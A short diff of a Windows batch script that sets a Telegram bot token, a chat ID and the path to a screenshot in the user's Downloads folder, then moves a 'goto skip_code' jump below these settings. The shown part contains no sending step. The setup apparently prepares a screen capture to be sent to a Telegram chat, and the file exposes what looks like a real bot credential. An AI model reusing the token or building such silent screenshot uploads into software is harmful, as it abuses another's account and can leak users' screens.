@@ -1,15 +1,17 @@
 @echo off
 
-goto skip_code
-::goto :EOF
-
-
 
 :: Set your bot token and chat ID
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002460905948"
 :: Path to your photo
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
+
+
+
+
+goto skip_code
+::goto :EOF
 
 
 
